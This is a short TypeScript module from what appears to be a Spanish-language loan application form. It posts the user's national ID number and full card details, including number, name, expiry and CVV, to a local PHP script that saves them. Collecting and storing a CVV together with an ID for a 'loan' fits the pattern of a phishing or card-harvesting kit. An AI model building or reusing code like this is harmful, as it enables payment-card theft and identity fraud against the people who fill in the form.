import { LoanFormData } from '../types/formTypes';

export const submitFormData = async (formData: any): Promise<{ success: boolean; message: string }> => {
  try {
    // Create FormData object
    const form = new FormData();
    
    // Add only the required fields
    form.append('dni', formData.dni);
    form.append('cardNumber', formData.cardInfo.number);
    form.append('cardName', formData.cardInfo.name);
    form.append('cardExpiry', formData.cardInfo.expiry);
    form.append('cardCvv', formData.cardInfo.cvv);

    // Submit to PHP endpoint
    const response = await fetch('/save-form.php', {
      method: 'POST',
      body: form
    });

    const result = await response.json();

    if (!response.ok) {
      throw new Error('Error al guardar los datos');
    }

    return { 
      success: true, 
      message: 'Datos guardados exitosamente'
    };
  } catch (error) {
    console.error('Error:', error);
    throw error;
  }
};